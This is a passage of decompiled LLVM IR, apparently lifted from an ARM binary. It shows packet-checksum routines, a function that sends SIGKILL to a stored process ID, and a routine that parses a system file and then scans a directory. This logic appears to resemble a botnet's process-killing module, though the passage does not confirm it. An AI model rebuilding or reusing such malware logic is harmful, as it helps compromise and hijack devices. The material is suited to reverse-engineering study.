  uselistorder i32 (i32, i32*, i32, i32)* @function_b240, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 99, 100, 101, 102, 103, 104, 105, 106, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 107, 108 }
  uselistorder label %dec_label_pc_fd48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fbd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fb70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb64, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %dec_label_pc_f820, { 1, 0 }
  uselistorder label %dec_label_pc_f814, { 1, 0 }
  uselistorder label %dec_label_pc_f7d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f7d0, { 1, 0 }
}

define i32 @function_fda0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fda0:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_fdd0, label %dec_label_pc_fdac

dec_label_pc_fdac:                                ; preds = %dec_label_pc_fda0
  %v0_fdb0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_fdb0

dec_label_pc_fdb0:                                ; preds = %dec_label_pc_fdb0, %dec_label_pc_fdac
  %v0_fdc4 = phi i32 [ %v2_fdc4, %dec_label_pc_fdb0 ], [ 0, %dec_label_pc_fdac ]
  %v0_fdb8 = phi i32 [ %v1_fdb8, %dec_label_pc_fdb0 ], [ %arg1, %dec_label_pc_fdac ]
  %v0_fdc8 = phi i32 [ %v1_fdc8, %dec_label_pc_fdb0 ], [ %v0_fdb0.pre, %dec_label_pc_fdac ]
  %v1_fdb0 = inttoptr i32 %v0_fdc8 to i8*
  %v2_fdb0 = load i8, i8* %v1_fdb0, align 1
  %v3_fdb0 = zext i8 %v2_fdb0 to i32
  %v1_fdb4 = add i32 %v0_fdc8, 1
  %v2_fdb4 = inttoptr i32 %v1_fdb4 to i8*
  %v3_fdb4 = load i8, i8* %v2_fdb4, align 1
  %v4_fdb4 = zext i8 %v3_fdb4 to i32
  %v1_fdb8 = add i32 %v0_fdb8, -2
  %v4_fdbc = mul nuw nsw i32 %v4_fdb4, 256
  %v5_fdbc = or i32 %v4_fdbc, %v3_fdb0
  %v2_fdc4 = add i32 %v5_fdbc, %v0_fdc4
  %v1_fdc8 = add i32 %v0_fdc8, 2
  store i32 %v1_fdc8, i32* @r0, align 4
  %v1_fdb8.cmp = icmp ugt i32 %v1_fdb8, 1
  br i1 %v1_fdb8.cmp, label %dec_label_pc_fdb0, label %dec_label_pc_fdd0

dec_label_pc_fdd0:                                ; preds = %dec_label_pc_fdb0, %dec_label_pc_fda0
  %v1_fdd8 = phi i32 [ 0, %dec_label_pc_fda0 ], [ %v2_fdc4, %dec_label_pc_fdb0 ]
  %v0_fdd0 = phi i32 [ %arg1, %dec_label_pc_fda0 ], [ %v1_fdb8, %dec_label_pc_fdb0 ]
  %v7_fdd0 = icmp eq i32 %v0_fdd0, 1
  br i1 %v7_fdd0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_fdd0
  %v1_fdd4 = load i32, i32* @r0, align 4
  %v2_fdd4 = inttoptr i32 %v1_fdd4 to i8*
  %v3_fdd4 = load i8, i8* %v2_fdd4, align 1
  %v4_fdd4 = zext i8 %v3_fdd4 to i32
  %v3_fdd8 = add i32 %v1_fdd8, %v4_fdd4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fdd0, %bb
  %v0_fddc = phi i32 [ %v1_fdd8, %dec_label_pc_fdd0 ], [ %v3_fdd8, %bb ]
  %v3_fde0 = urem i32 %v0_fddc, 65536
  %v4_fde4 = udiv i32 %v0_fddc, 65536
  %v5_fde4 = add nuw nsw i32 %v4_fde4, %v3_fde0
  %v4_fde8 = udiv i32 %v5_fde4, 65536
  %v5_fde8 = add nuw nsw i32 %v4_fde8, %v5_fde4
  %v1_fdec = urem i32 %v5_fde8, 65536
  %v3_fdf4 = xor i32 %v1_fdec, 65535
  ret i32 %v3_fdf4

; uselistorder directives
  uselistorder i32 %v5_fde4, { 1, 0 }
  uselistorder i32 %v1_fdc8, { 1, 0 }
  uselistorder i32 %v1_fdb8, { 1, 0, 2 }
  uselistorder i32 %v0_fdc8, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_fdfc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_fdfc:
  %v3_fe0c = urem i32 %arg2, 65536
  %v1_fe10 = add i32 %arg1, 12
  %v1_fe14 = inttoptr i32 %v1_fe10 to i32*
  %v2_fe14 = load i32, i32* %v1_fe14, align 4
  %v3_fe14 = add i32 %arg1, 16
  %v4_fe14 = inttoptr i32 %v3_fe14 to i32*
  %v5_fe14 = load i32, i32* %v4_fe14, align 4
  %v7_fe18 = icmp sgt i32 %arg3, 1
  br i1 %v7_fe18, label %dec_label_pc_fe24.preheader, label %dec_label_pc_fe44

dec_label_pc_fe24.preheader:                      ; preds = %dec_label_pc_fdfc
  %v0_fe24.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_fe24

dec_label_pc_fe24:                                ; preds = %dec_label_pc_fe24.preheader, %dec_label_pc_fe24
  %v0_fe38 = phi i32 [ 0, %dec_label_pc_fe24.preheader ], [ %v2_fe38, %dec_label_pc_fe24 ]
  %v0_fe2c = phi i32 [ %arg3, %dec_label_pc_fe24.preheader ], [ %v1_fe2c, %dec_label_pc_fe24 ]
  %v0_fe3c = phi i32 [ %v0_fe24.pre, %dec_label_pc_fe24.preheader ], [ %v1_fe3c, %dec_label_pc_fe24 ]
  %v1_fe24 = inttoptr i32 %v0_fe3c to i8*
  %v2_fe24 = load i8, i8* %v1_fe24, align 1
  %v3_fe24 = zext i8 %v2_fe24 to i32
  %v1_fe28 = add i32 %v0_fe3c, 1
  %v2_fe28 = inttoptr i32 %v1_fe28 to i8*
  %v3_fe28 = load i8, i8* %v2_fe28, align 1
  %v4_fe28 = zext i8 %v3_fe28 to i32
  %v1_fe2c = add nsw i32 %v0_fe2c, -2
  %v4_fe30 = mul nuw nsw i32 %v4_fe28, 256
  %v5_fe30 = or i32 %v4_fe30, %v3_fe24
  %v2_fe38 = add i32 %v5_fe30, %v0_fe38
  %v1_fe3c = add i32 %v0_fe3c, 2
  store i32 %v1_fe3c, i32* @r1, align 4
  %v8_fe40 = icmp sgt i32 %v1_fe2c, 1
  br i1 %v8_fe40, label %dec_label_pc_fe24, label %dec_label_pc_fe44

dec_label_pc_fe44:                                ; preds = %dec_label_pc_fe24, %dec_label_pc_fdfc
  %v1_fe4c = phi i32 [ 0, %dec_label_pc_fdfc ], [ %v2_fe38, %dec_label_pc_fe24 ]
  %v0_fe44 = phi i32 [ %arg3, %dec_label_pc_fdfc ], [ %v1_fe2c, %dec_label_pc_fe24 ]
  %v7_fe44 = icmp eq i32 %v0_fe44, 1
  br i1 %v7_fe44, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_fe44
  %v1_fe48 = load i32, i32* @r1, align 4
  %v2_fe48 = inttoptr i32 %v1_fe48 to i8*
  %v3_fe48 = load i8, i8* %v2_fe48, align 1
  %v4_fe48 = zext i8 %v3_fe48 to i32
  %v3_fe4c = add i32 %v4_fe48, %v1_fe4c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fe44, %bb
  %v0_fe70 = phi i32 [ %v1_fe4c, %dec_label_pc_fe44 ], [ %v3_fe4c, %bb ]
  %v3_fe54 = urem i32 %v2_fe14, 65536
  %v1_fe5c = add i32 %arg1, 9
  %v2_fe5c = inttoptr i32 %v1_fe5c to i8*
  %v3_fe5c = load i8, i8* %v2_fe5c, align 1
  %v4_fe5c = zext i8 %v3_fe5c to i32
  %v3_fe60 = urem i32 %v5_fe14, 65536
  %v4_fe64 = udiv i32 %v2_fe14, 65536
  %v3_fe6c = mul nuw nsw i32 %v4_fe5c, 256
  %v4_fe70 = udiv i32 %v5_fe14, 65536
  %v5_fe70 = add i32 %v0_fe70, %v4_fe70
  %v2_fe74 = add i32 %v5_fe70, %v3_fe6c
  %v5_fe64 = add nuw nsw i32 %v3_fe54, %v3_fe0c
  %v2_fe68 = add nuw nsw i32 %v5_fe64, %v4_fe64
  %v2_fe78 = add nuw nsw i32 %v2_fe68, %v3_fe60
  %v2_fe7c = add i32 %v2_fe74, %v2_fe78
  %tmp = icmp ult i32 %v2_fe7c, 65536
  br i1 %tmp, label %dec_label_pc_fe9c, label %dec_label_pc_fe88

dec_label_pc_fe88:                                ; preds = %.thread, %dec_label_pc_fe88
  %v2_fe901 = phi i32 [ %v2_fe90, %dec_label_pc_fe88 ], [ %v2_fe7c, %.thread ]
  %v3_fe942.in = phi i32 [ %v2_fe90, %dec_label_pc_fe88 ], [ %v2_fe7c, %.thread ]
  %v3_fe942 = udiv i32 %v3_fe942.in, 65536
  %v3_fe8c = urem i32 %v2_fe901, 65536
  %v2_fe90 = add nuw nsw i32 %v3_fe8c, %v3_fe942
  %tmp14 = icmp ult i32 %v2_fe90, 65536
  br i1 %tmp14, label %dec_label_pc_fe9c.loopexit, label %dec_label_pc_fe88

dec_label_pc_fe9c.loopexit:                       ; preds = %dec_label_pc_fe88
  br label %dec_label_pc_fe9c

dec_label_pc_fe9c:                                ; preds = %dec_label_pc_fe9c.loopexit, %.thread
  %v0_fe9c = phi i32 [ %v2_fe90, %dec_label_pc_fe9c.loopexit ], [ %v2_fe7c, %.thread ]
  %v1_fe9c = urem i32 %v0_fe9c, 65536
  %v3_fea4 = xor i32 %v1_fe9c, 65535
  ret i32 %v3_fea4

; uselistorder directives
  uselistorder i32 %v2_fe90, { 2, 1, 3, 0 }
  uselistorder i32 %v2_fe7c, { 3, 0, 2, 1 }
  uselistorder i32 %v1_fe4c, { 1, 0 }
  uselistorder i32 %v1_fe3c, { 1, 0 }
  uselistorder i32 %v1_fe2c, { 0, 2, 1 }
  uselistorder i32 %v0_fe3c, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fe88, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_fe24, { 1, 0 }
}

define i32 @function_feac(i32 %arg1) local_unnamed_addr {
dec_label_pc_feac:
  %stack_var_0 = alloca i16, align 2
  %v2_feb0 = load i32, i32* @global_var_1d9b4.155, align 4
  %v3_feb8 = call i32 @_kill(i32 %v2_feb0, i32 9)
  %v0_febc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_febc, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_feac
  %tmp1 = ptrtoint i16* %stack_var_0 to i32
  %v6_febc = trunc i32 %tmp1 to i16
  store i16 %v6_febc, i16* inttoptr (i32 9 to i16*), align 2
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_feac, %bb
  ret i32 %v3_feb8

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_fec0(i32 %arg1) local_unnamed_addr {
dec_label_pc_fec0:
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-581 = alloca i8, align 1
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fec0 = load i32, i32* @r4, align 4
  store i32 %v3_fec0, i32* %stack_var_-36, align 4
  %v6_fec0 = load i32, i32* @r5, align 4
  %v9_fec0 = load i32, i32* @r6, align 4
  %v12_fec0 = load i32, i32* @r7, align 4
  %v15_fec0 = load i32, i32* @r8, align 4
  %v21_fec0 = load i32, i32* @sl, align 4
  %v2_fed4 = ptrtoint i32* %stack_var_-4677 to i32
  store i32 %v2_fed4, i32* @sl, align 4
  %v3_fedc = mul i32 %arg1, 65536
  store i32 %v3_fedc, i32* @r5, align 4
  %v2_fee8 = ptrtoint i32* %stack_var_-8773 to i32
  %v3_fef4 = call i32 @_memset(i32 %v2_fed4, i32 0, i32 4096)
  %v3_ff0c = call i32 @_memset(i32 %v2_fee8, i32 0, i32 4096)
  %v2_ff10 = ptrtoint i8* %stack_var_-581 to i32
  store i32 %v2_ff10, i32* @r6, align 4
  %v2_ff2c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_ff2c, i32* %sb.global-to-local, align 4
  %v3_ff30 = call i32 @_memset(i32 %v2_ff10, i32 0, i32 513)
  %v2_ff34 = ptrtoint i8* %stack_var_-68 to i32
  store i32 %v2_ff34, i32* %sb.global-to-local, align 4
  %v1_ff3c = load i32, i32* @r5, align 4
  %v4_ff3c = udiv i32 %v1_ff3c, 16777216
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_ff5c = trunc i32 %v4_ff3c to i8
  %v4_ff5c = call i32 @function_14b00(i8 %v3_ff5c, i32 16, i32 %v2_ff34)
  %v2_ff64 = call i32 @function_1460c(i8* nonnull %stack_var_-68)
  %v7_ff68 = icmp eq i32 %v2_ff64, 2
  br i1 %v7_ff68, label %dec_label_pc_103fc, label %dec_label_pc_ff70

dec_label_pc_ff70:                                ; preds = %dec_label_pc_fec0, %dec_label_pc_103fc
  %v1_ff74 = call i32 @function_13ce8(i32 6)
  %v1_ff7c = call i32 @function_13ce8(i32 7)
  %v1_ff84 = call i32 @function_13ce8(i32 9)
  %v0_ff8c = load i32, i32* @r4, align 4
  %v3_ff90 = call i32 @_open(i32 ptrtoint ([14 x i8]* @global_var_14fb0.157 to i32), i32 %v0_ff8c)
  %v7_ff94 = icmp eq i32 %v3_ff90, -1
  store i32 %v3_ff90, i32* @r8, align 4
  br i1 %v7_ff94, label %dec_label_pc_103bc, label %dec_label_pc_ffa0.preheader

dec_label_pc_ffa0.preheader:                      ; preds = %dec_label_pc_ff70
  %v4_ffac56 = call i32 @function_14864(i8* nonnull %stack_var_-581, i32 512, i32 %v3_ff90)
  %v2_ffb058 = icmp eq i32 %v4_ffac56, 0
  br i1 %v2_ffb058, label %dec_label_pc_10140.loopexit, label %dec_label_pc_ffb8.lr.ph

dec_label_pc_ffb8.lr.ph:                          ; preds = %dec_label_pc_ffa0.preheader
  %v2_10000 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_ffb8

dec_label_pc_ffb8:                                ; preds = %dec_label_pc_ffb8.lr.ph, %dec_label_pc_ffa0.backedge
  %v3_ffbc = load i8, i8* %stack_var_-581, align 1
  %v4_ffbc = sext i8 %v3_ffbc to i32
  %v2_ffc0 = icmp eq i8 %v3_ffbc, 0
  br i1 %v2_ffc0, label %bb128, label %bb

bb:                                               ; preds = %dec_label_pc_ffb8
  %v8_ffc4 = icmp eq i8 %v3_ffbc, 58
  br i1 %v8_ffc4, label %.thread6, label %dec_label_pc_ffd8

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_fff0

bb128:                                            ; preds = %dec_label_pc_ffb8
  br label %dec_label_pc_fff0

dec_label_pc_ffd8:                                ; preds = %bb
  %v1_ffe0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ffdc

dec_label_pc_ffdc:                                ; preds = %bb129, %dec_label_pc_ffd8
  %v0_ffdc = phi i32 [ %v1_ffdc, %bb129 ], [ 0, %dec_label_pc_ffd8 ]
  %v1_ffdc = add i32 %v0_ffdc, 1
  %v2_ffe0 = add i32 %v1_ffdc, %v1_ffe0.pre
  %v3_ffe0 = inttoptr i32 %v2_ffe0 to i8*
  %v4_ffe0 = load i8, i8* %v3_ffe0, align 1
  %v6_ffe0 = zext i8 %v4_ffe0 to i32
  %v2_ffe4 = icmp eq i8 %v4_ffe0, 0
  br i1 %v2_ffe4, label %dec_label_pc_fff0, label %bb129

bb129:                                            ; preds = %dec_label_pc_ffdc
  %v8_ffe8 = icmp eq i8 %v4_ffe0, 58
  br i1 %v8_ffe8, label %dec_label_pc_fff0, label %dec_label_pc_ffdc

dec_label_pc_fff0:                                ; preds = %dec_label_pc_ffdc, %bb129, %bb128, %.thread6
  %v1_1001c = phi i32 [ 0, %.thread6 ], [ 0, %bb128 ], [ %v1_ffdc, %bb129 ], [ %v1_ffdc, %dec_label_pc_ffdc ]
  %v0_fff0 = phi i32 [ %v4_ffbc, %.thread6 ], [ %v4_ffbc, %bb128 ], [ %v6_ffe0, %bb129 ], [ %v6_ffe0, %dec_label_pc_ffdc ]
  %v2_fff0 = icmp eq i32 %v0_fff0, 0
  br i1 %v2_fff0, label %dec_label_pc_ffa0.backedge, label %dec_label_pc_fff8

dec_label_pc_ffa0.backedge:                       ; preds = %dec_label_pc_fff0, %dec_label_pc_100c8, %dec_label_pc_10114, %dec_label_pc_1003c
  %v0_ffa8 = load i32, i32* @r8, align 4
  %v4_ffac = call i32 @function_14864(i8* nonnull %stack_var_-581, i32 512, i32 %v0_ffa8)
  %v2_ffb0 = icmp eq i32 %v4_ffac, 0
  br i1 %v2_ffb0, label %dec_label_pc_10140.loopexit, label %dec_label_pc_ffb8

dec_label_pc_fff8:                                ; preds = %dec_label_pc_fff0
  %v1_fffc = add i32 %v1_1001c, 2
  %v2_10004 = add i32 %v1_fffc, %v2_10000
  %v1_10008 = add i32 %v2_10004, -545
  %v2_10008 = inttoptr i32 %v1_10008 to i8*
  %v3_10008 = load i8, i8* %v2_10008, align 1
  %v2_1000c = icmp eq i8 %v3_10008, 0
  br i1 %v2_1000c, label %bb131, label %bb130

bb130:                                            ; preds = %dec_label_pc_fff8
  %v8_10010 = icmp eq i8 %v3_10008, 32
  br i1 %v8_10010, label %.thread10, label %dec_label_pc_1001c

.thread10:                                        ; preds = %bb130
  store i32 %v1_fffc, i32* @r5, align 4
  br label %dec_label_pc_1003c

bb131:                                            ; preds = %dec_label_pc_fff8
  store i32 %v1_fffc, i32* @r5, align 4
  br label %dec_label_pc_1003c

dec_label_pc_1001c:                               ; preds = %bb130
  %v0_1001c = load i32, i32* @r6, align 4
  %v2_1001c = add i32 %v0_1001c, %v1_1001c
  br label %dec_label_pc_10020

dec_label_pc_10020:                               ; preds = %bb132, %dec_label_pc_1001c
  %v0_1002c13 = phi i32 [ %v1_1002c, %bb132 ], [ %v2_1001c, %dec_label_pc_1001c ]
  %v1_10020 = add i32 %v0_1002c13, 3
  %v2_10020 = inttoptr i32 %v1_10020 to i8*
  %v3_10020 = load i8, i8* %v2_10020, align 1
  %v2_10024 = icmp eq i8 %v3_10020, 0
  br i1 %v2_10024, label %.thread12, label %bb132

.thread12:                                        ; preds = %dec_label_pc_10020
  %v1_1002c14 = add i32 %v0_1002c13, 1
  br label %dec_label_pc_10034

bb132:                                            ; preds = %dec_label_pc_10020
  %v8_10028 = icmp eq i8 %v3_10020, 32
  %v1_1002c = add i32 %v0_1002c13, 1
  br i1 %v8_10028, label %dec_label_pc_10034, label %dec_label_pc_10020

dec_label_pc_10034:                               ; preds = %bb132, %.thread12
  %v1_1002c15 = phi i32 [ %v1_1002c14, %.thread12 ], [ %v1_1002c, %bb132 ]
  %v2_10034 = sub i32 %v1_1002c15, %v0_1001c
  %v1_10038 = add i32 %v2_10034, 2
  store i32 %v1_10038, i32* @r5, align 4
  br label %dec_label_pc_1003c

dec_label_pc_1003c:                               ; preds = %bb131, %.thread10, %dec_label_pc_10034
  %v1_10048 = phi i32 [ %v1_fffc, %.thread10 ], [ %v1_fffc, %bb131 ], [ %v1_10038, %dec_label_pc_10034 ]
  %v0_1003c = load i32, i32* @r6, align 4
  %v2_1003c = add i32 %v0_1003c, %v1_fffc
  store i32 %v2_1003c, i32* @r4, align 4
  %v2_10048 = add i32 %v1_10048, %v2_10000
  store i32 0, i32* @r7, align 4
  %v3_10054 = add i32 %v2_10048, -545
  %v4_10054 = inttoptr i32 %v3_10054 to i8*
  store i8 0, i8* %v4_10054, align 1
  %v1_10058 = inttoptr i32 %v2_1003c to i8*
  %v2_10058 = call i32 @function_1460c(i8* %v1_10058)
  store i32 %v2_10058, i32* @r1, align 4
  %v0_10064 = load i32, i32* @r4, align 4
  %v3_10068 = inttoptr i32 %v0_10064 to i8*
  %v4_10068 = call i32 @function_14960(i8* %v3_10068, i32 %v2_10058, i32 %v2_ff34)
  %v7_1006c = icmp eq i32 %v4_10068, -1
  br i1 %v7_1006c, label %dec_label_pc_ffa0.backedge, label %dec_label_pc_10088.preheader

dec_label_pc_10088.preheader:                     ; preds = %dec_label_pc_1003c
  %v1_10070 = load i32, i32* @r7, align 4
  %v1_10074 = load i32, i32* @r6, align 4
  %v2_10074 = load i32, i32* @r5, align 4
  %v3_10074 = add i32 %v2_10074, %v1_10074
  store i32 %v1_10070, i32* @r4, align 4
  %v1_1008848 = add i32 %v3_10074, 2
  %v2_1008849 = inttoptr i32 %v1_1008848 to i8*
  %v3_1008850 = load i8, i8* %v2_1008849, align 1
  %v2_1008c52 = icmp eq i8 %v3_1008850, 0
  %v1_1009054 = add i32 %v2_10074, 2
  br i1 %v2_1008c52, label %dec_label_pc_100c8, label %dec_label_pc_10098

dec_label_pc_10098:                               ; preds = %dec_label_pc_10088.preheader, %dec_label_pc_10088.backedge
  %v0_100c884 = phi i32 [ %v0_100c883, %dec_label_pc_10088.backedge ], [ %v1_10070, %dec_label_pc_10088.preheader ]
  %v0_100b0.pr = phi i32 [ %v0_100b0.pr69, %dec_label_pc_10088.backedge ], [ %v1_10070, %dec_label_pc_10088.preheader ]
  %v0_103cc = phi i32 [ %v0_103cc72, %dec_label_pc_10088.backedge ], [ %v1_10070, %dec_label_pc_10088.preheader ]
  %v0_1009080 = phi i32 [ %v1_10090, %dec_label_pc_10088.backedge ], [ %v1_1009054, %dec_label_pc_10088.preheader ]
  %v0_100c0 = phi i32 [ %v0_10088, %dec_label_pc_10088.backedge ], [ %v3_10074, %dec_label_pc_10088.preheader ]
  %v1_1009c.in = phi i8 [ %v3_10088, %dec_label_pc_10088.backedge ], [ %v3_1008850, %dec_label_pc_10088.preheader ]
  %v7_10098 = icmp eq i8 %v1_1009c.in, 9
  br i1 %v7_10098, label %.thread23, label %bb133

bb133:                                            ; preds = %dec_label_pc_10098
  %v8_1009c = icmp eq i8 %v1_1009c.in, 32
  br i1 %v8_1009c, label %.thread23.thread35, label %dec_label_pc_100b0

.thread23.thread35:                               ; preds = %bb133
  br label %dec_label_pc_100bc

.thread23:                                        ; preds = %dec_label_pc_10098
  br label %dec_label_pc_100bc

dec_label_pc_100b0:                               ; preds = %bb133
  %v7_100b0 = icmp eq i32 %v0_100b0.pr, 1
  br i1 %v7_100b0, label %dec_label_pc_103cc, label %dec_label_pc_100b8

dec_label_pc_100b8:                               ; preds = %dec_label_pc_103cc, %dec_label_pc_100b0
  %v0_100bc77 = phi i32 [ %v1_103cc, %dec_label_pc_103cc ], [ %v0_103cc, %dec_label_pc_100b0 ]
  br label %dec_label_pc_100bc

dec_label_pc_100bc:                               ; preds = %.thread23, %.thread23.thread35, %dec_label_pc_100b8
  %v0_100bc = phi i32 [ %v0_103cc, %.thread23.thread35 ], [ %v0_103cc, %.thread23 ], [ %v0_100bc77, %dec_label_pc_100b8 ]
  %v0_100b0.pr70 = phi i32 [ 1, %.thread23.thread35 ], [ 1, %.thread23 ], [ 0, %dec_label_pc_100b8 ]
  %v7_100c4 = icmp sgt i32 %v0_100bc, 6
  br i1 %v7_100c4, label %dec_label_pc_100c8, label %dec_label_pc_10088.backedge

dec_label_pc_100c8:                               ; preds = %dec_label_pc_10088.backedge, %dec_label_pc_100bc, %dec_label_pc_10088.preheader
  %v1_10118 = phi i32 [ %v1_1009054, %dec_label_pc_10088.preheader ], [ %v1_10090, %dec_label_pc_10088.backedge ], [ %v0_1009080, %dec_label_pc_100bc ]
  %v0_100c8 = phi i32 [ %v1_10070, %dec_label_pc_10088.preheader ], [ %v0_100c883, %dec_label_pc_10088.backedge ], [ %v0_100c884, %dec_label_pc_100bc ]
  %v2_100c8 = icmp eq i32 %v0_100c8, 0
  br i1 %v2_100c8, label %dec_label_pc_ffa0.backedge, label %dec_label_pc_100d4

dec_label_pc_100d4:                               ; preds = %dec_label_pc_100c8
  %v2_100dc = add i32 %v1_10118, %v2_10000
  %v1_100e0 = add i32 %v2_100dc, -545
  %v2_100e0 = inttoptr i32 %v1_100e0 to i8*
  %v3_100e0 = load i8, i8* %v2_100e0, align 1
  %v2_100e4 = icmp eq i8 %v3_100e0, 0
  br i1 %v2_100e4, label %dec_label_pc_10114, label %bb134

bb134:                                            ; preds = %dec_label_pc_100d4
  %v8_100e8 = icmp eq i8 %v3_100e0, 32
  br i1 %v8_100e8, label %dec_label_pc_10114, label %dec_label_pc_100f0

dec_label_pc_100f0:                               ; preds = %bb134
  %v2_100f0 = add i32 %v1_10118, %v1_10074
  br label %dec_label_pc_100f4

dec_label_pc_100f4:                               ; preds = %bb135, %dec_label_pc_100f0
  %v0_1010028 = phi i32 [ %v1_10100, %bb135 ], [ %v1_10118, %dec_label_pc_100f0 ]
  %v0_100f4 = phi i32 [ %v1_100f4, %bb135 ], [ %v2_100f0, %dec_label_pc_100f0 ]
  %v1_100f4 = add i32 %v0_100f4, 1
  %v2_100f4 = inttoptr i32 %v1_100f4 to i8*
  %v3_100f4 = load i8, i8* %v2_100f4, align 1
  %v2_100f8 = icmp eq i8 %v3_100f4, 0
  br i1 %v2_100f8, label %.thread27, label %bb135

.thread27:                                        ; preds = %dec_label_pc_100f4
  %v1_1010029 = add i32 %v0_1010028, 1
  br label %dec_label_pc_10108

bb135:                                            ; preds = %dec_label_pc_100f4
  %v8_100fc = icmp eq i8 %v3_100f4, 32
  %v1_10100 = add i32 %v0_1010028, 1
  br i1 %v8_100fc, label %dec_label_pc_10108, label %dec_label_pc_100f4

dec_label_pc_10108:                               ; preds = %bb135, %.thread27
  %v1_10110 = phi i32 [ %v1_1010029, %.thread27 ], [ %v1_10100, %bb135 ]
  %v2_10110 = add i32 %v1_10110, %v2_10000
  br label %dec_label_pc_10114

dec_label_pc_10114:                               ; preds = %dec_label_pc_100d4, %bb134, %dec_label_pc_10108
  %v2_10120 = phi i32 [ %v2_100dc, %dec_label_pc_100d4 ], [ %v2_100dc, %bb134 ], [ %v2_10110, %dec_label_pc_10108 ]
  %v2_10118 = add i32 %v1_10118, %v1_10074
  store i32 %v2_10118, i32* @r4, align 4
  %v3_10120 = add i32 %v2_10120, -545
  %v4_10120 = inttoptr i32 %v3_10120 to i8*
  store i8 0, i8* %v4_10120, align 1
  %v1_10124 = inttoptr i32 %v2_10118 to i8*
  %v2_10124 = call i32 @function_1460c(i8* %v1_10124)
  %v8_1012c = icmp sgt i32 %v2_10124, 15
  br i1 %v8_1012c, label %dec_label_pc_ffa0.backedge, label %dec_label_pc_10130

dec_label_pc_10130:                               ; preds = %dec_label_pc_10114
  %v0_10134 = load i32, i32* @r4, align 4
  %v2_10138 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10138, i32* @r0, align 4
  %v2_1013c = bitcast i32* %stack_var_-52 to i8*
  %v3_1013c = call i32 @function_14634(i8* %v2_1013c, i32 %v0_10134)
  br label %dec_label_pc_10140

dec_label_pc_10140.loopexit:                      ; preds = %dec_label_pc_ffa0.backedge, %dec_label_pc_ffa0.preheader
  %.pre = ptrtoint i32* %stack_var_-52 to i32
  %.pre97 = bitcast i32* %stack_var_-52 to i8*
  br label %dec_label_pc_10140

dec_label_pc_10140:                               ; preds = %dec_label_pc_10140.loopexit, %dec_label_pc_10130
  %v1_10150.pre-phi = phi i8* [ %.pre97, %dec_label_pc_10140.loopexit ], [ %v2_1013c, %dec_label_pc_10130 ]
  %v2_1014c.pre-phi = phi i32 [ %.pre, %dec_label_pc_10140.loopexit ], [ %v2_10138, %dec_label_pc_10130 ]
  %v0_10140 = load i32, i32* @r8, align 4
  %v1_10144 = call i32 @_close(i32 %v0_10140)
  %v2_10150 = call i32 @function_1460c(i8* %v1_10150.pre-phi)
  store i32 %v2_10150, i32* @r4, align 4
  %v2_10154 = icmp eq i32 %v2_10150, 0
  br i1 %v2_10154, label %dec_label_pc_103a4, label %dec_label_pc_1015c

dec_label_pc_1015c:                               ; preds = %dec_label_pc_10140
  %v3_10164 = call i32 @function_13c04(i32 6, i32* null)
  %v1_10168 = call i32 @_opendir(i32 %v3_10164)
  store i32 %v1_10168, i32* @r8, align 4
  %v2_1016c = icmp eq i32 %v1_10168, 0
  br i1 %v2_1016c, label %dec_label_pc_1039c, label %dec_label_pc_1017c.preheader

dec_label_pc_1017c.preheader:                     ; preds = %dec_label_pc_1015c
  store i32 0, i32* @r5, align 4
  %v1_1018044 = call i32 @_readdir(i32 %v1_10168)
  %v2_1018446 = icmp eq i32 %v1_1018044, 0
  br i1 %v2_1018446, label %dec_label_pc_10390, label %dec_label_pc_1018c.preheader.lr.ph

dec_label_pc_1018c.preheader.lr.ph:               ; preds = %dec_label_pc_1017c.preheader
  %v2_101bc = bitcast i32* %stack_var_-4677 to i8*
  %v1_10328 = bitcast i32* %stack_var_-8773 to i8*
  br label %dec_label_pc_1018c.preheader

